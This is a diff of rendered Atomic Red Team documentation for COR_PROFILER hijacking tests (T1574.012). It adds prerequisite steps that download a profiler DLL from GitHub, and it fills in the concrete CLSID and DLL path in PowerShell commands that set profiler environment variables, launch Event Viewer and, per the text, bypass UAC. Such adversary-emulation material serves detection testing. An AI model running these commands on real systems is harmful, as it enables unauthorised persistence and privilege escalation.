@@ -664,6 +664,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-file-name-must-be-present">
+         Description: #{file_name} must be present
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -682,6 +710,34 @@
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id1">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id2">
+         Description: #{file_name} must be present
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id3">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id5">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -698,7 +754,35 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id2">
+      <a class="reference internal nav-link" href="#id6">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id7">
+         Description: #{file_name} must be present
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id8">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id9">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id10">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -750,13 +834,39 @@ If the account used is not a local administrator the profiler DLL will still exe
 the notepad process will not execute with high integrity.</p>
 <p>Reference: https://redcanary.com/blog/cor_profiler-for-persistence/</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-file-name-must-be-present">
+<h5>Description: #{file_name} must be present<a class="headerlink" href="#description-file-name-must-be-present" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1574</span><span class="o">.</span><span class="mi">012</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Write-Host &quot;Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}&quot; -ForegroundColor Cyan
-New-Item -Path &quot;HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32&quot; -Value #{file_name} -Force | Out-Null
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Write-Host &quot;Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}&quot; -ForegroundColor Cyan
+New-Item -Path &quot;HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32&quot; -Value PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll -Force | Out-Null
 New-ItemProperty -Path HKCU:\Environment -Name &quot;COR_ENABLE_PROFILING&quot; -PropertyType String -Value &quot;1&quot; -Force | Out-Null
-New-ItemProperty -Path HKCU:\Environment -Name &quot;COR_PROFILER&quot; -PropertyType String -Value &quot;#{clsid_guid}&quot; -Force | Out-Null
-New-ItemProperty -Path HKCU:\Environment -Name &quot;COR_PROFILER_PATH&quot; -PropertyType String -Value #{file_name} -Force | Out-Null
+New-ItemProperty -Path HKCU:\Environment -Name &quot;COR_PROFILER&quot; -PropertyType String -Value &quot;{09108e71-974c-4010-89cb-acf471ae9e2c}&quot; -Force | Out-Null
+New-ItemProperty -Path HKCU:\Environment -Name &quot;COR_PROFILER_PATH&quot; -PropertyType String -Value PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll -Force | Out-Null
 Write-Host &quot;executing eventvwr.msc&quot; -ForegroundColor Cyan
 START MMC.EXE EVENTVWR.MSC
 </pre></div>
@@ -776,13 +886,40 @@ START MMC.EXE EVENTVWR.MSC
 The unmanaged profiler DLL (T1574.012x64.dll<code class="docutils literal notranslate"><span class="pre">)</span> <span class="pre">executes</span> <span class="pre">when</span> <span class="pre">the</span> <span class="pre">CLR</span> <span class="pre">is</span> <span class="pre">loaded</span> <span class="pre">by</span> <span class="pre">any</span> <span class="pre">process.</span> <span class="pre">Additionally,</span> <span class="pre">the</span> <span class="pre">profiling</span> <span class="pre">DLL</span> <span class="pre">will</span> <span class="pre">inherit</span> <span class="pre">the</span> <span class="pre">integrity</span> <span class="pre">level</span> <span class="pre">of</span> <span class="pre">Event</span> <span class="pre">Viewer</span> <span class="pre">bypassing</span> <span class="pre">UAC</span> <span class="pre">and</span> <span class="pre">executing</span> </code>notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will
 still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.</p>
 <p>Reference: https://redcanary.com/blog/cor_profiler-for-persistence/</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id1">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id2">
+<h5>Description: #{file_name} must be present<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id3">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id4">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1574</span><span class="o">.</span><span class="mi">012</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id5">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Write-Host</span> <span class="s2">&quot;Creating system environment variables&quot;</span> <span class="n">-ForegroundColor</span> <span class="n">Cyan</span>
 <span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#39;</span> <span class="n">-Name</span> <span class="s2">&quot;COR_ENABLE_PROFILING&quot;</span> <span class="n">-PropertyType</span> <span class="n">String</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
-<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#39;</span> <span class="n">-Name</span> <span class="s2">&quot;COR_PROFILER&quot;</span> <span class="n">-PropertyType</span> <span class="n">String</span> <span class="n">-Value</span> <span class="s2">&quot;#{clsid_guid}&quot;</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
-<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#39;</span> <span class="n">-Name</span> <span class="s2">&quot;COR_PROFILER_PATH&quot;</span> <span class="n">-PropertyType</span> <span class="n">String</span> <span class="n">-Value</span> <span class="c">#{file_name} -Force | Out-Null</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#39;</span> <span class="n">-Name</span> <span class="s2">&quot;COR_PROFILER&quot;</span> <span class="n">-PropertyType</span> <span class="n">String</span> <span class="n">-Value</span> <span class="s2">&quot;{09108e71-974c-4010-89cb-acf471ae9e2c}&quot;</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#39;</span> <span class="n">-Name</span> <span class="s2">&quot;COR_PROFILER_PATH&quot;</span> <span class="n">-PropertyType</span> <span class="n">String</span> <span class="n">-Value</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012x64</span><span class="p">.</span><span class="n">dll</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -799,11 +936,37 @@ still execute each time the CLR is loaded by a process, however, the notepad pro
 <p>Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (<code class="docutils literal notranslate"><span class="pre">T1574.012x64.dll</span></code>) executes when the CLR is loaded by PowerShell.</p>
 <p>Reference: https://redcanary.com/blog/cor_profiler-for-persistence/</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id2">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id6">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id7">
+<h5>Description: #{file_name} must be present<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id8">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id9">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1574</span><span class="p">.</span><span class="n">012x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1574</span><span class="o">.</span><span class="mi">012</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id10">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$env:COR_ENABLE_PROFILING</span> <span class="p">=</span> <span class="n">1</span>
-<span class="nv">$env:COR_PROFILER</span> <span class="p">=</span> <span class="s1">&#39;#{clsid_guid}&#39;</span>
-<span class="nv">$env:COR_PROFILER_PATH</span> <span class="p">=</span> <span class="s1">&#39;#{file_name}&#39;</span>
+<span class="nv">$env:COR_PROFILER</span> <span class="p">=</span> <span class="s1">&#39;{09108e71-974c-4010-89cb-acf471ae9e2c}&#39;</span>
+<span class="nv">$env:COR_PROFILER_PATH</span> <span class="p">=</span> <span class="s1">&#39;PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll&#39;</span>
 <span class="n">POWERSHELL</span> <span class="n">-c</span> <span class="s1">&#39;Start-Sleep 1&#39;</span>
 </pre></div>
 </div>
